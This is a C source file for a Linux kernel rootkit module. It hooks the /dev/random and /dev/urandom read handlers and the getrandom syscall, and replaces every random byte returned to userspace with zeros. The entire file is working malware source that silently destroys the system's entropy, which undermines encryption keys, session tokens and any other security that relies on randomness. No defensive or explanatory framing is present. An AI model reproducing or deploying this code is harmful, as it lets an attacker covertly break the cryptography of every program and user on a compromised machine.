//
// Created by sciver on 10/17/22.
//

#include "hook_random.h"
asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real random_read() */
    bytes_read = orig_random_read(file, buf, nbytes, ppos);

    /* Allocate a kernel buffer big enough to hold everything */
    kbuf = kvmalloc(bytes_read, GFP_KERNEL);

    /* Copy the random bytes from the userspace buf */
    error = copy_from_user(kbuf, buf, bytes_read);

    /* Check for any errors in copying */
    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kvfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged buffer back to userspace */
    error = copy_to_user(buf, kbuf, bytes_read);
    if(error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied back into buf\n", error);

    /* Free the buffer before returning */
    kvfree(kbuf);
    return bytes_read;
}

asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real urandom_read() file operation to set up all the structures */
    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted call to /dev/urandom: %d bytes", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into.
     * Note that copy_from_user() returns the number of bytes that could NOT be copied
     */
    kbuf = kvmalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kvfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kvfree(kbuf);
    return bytes_read;
}
asmlinkage long (*orig_random)(const struct pt_regs *);
asmlinkage int hook_random(const struct pt_regs *regs)
{
    long error;
    char *kbuf = NULL;
    int i = 0;
    void *buf = (void *)regs->di;
//    size_t buflen = (size_t)regs->si;
//    unsigned int flags = (unsigned int)regs->dx;

    /* Call the real urandom_read() file operation to set up all the structures */
    int bytes_read = orig_random(regs);
    printk(KERN_DEBUG "rootkit: intercepted call to /dev/urandom: %d bytes", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into.
     * Note that copy_from_user() returns the number of bytes that could NOT be copied
     */
    kbuf = kvmalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kvfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kvfree(kbuf);
    return bytes_read;

}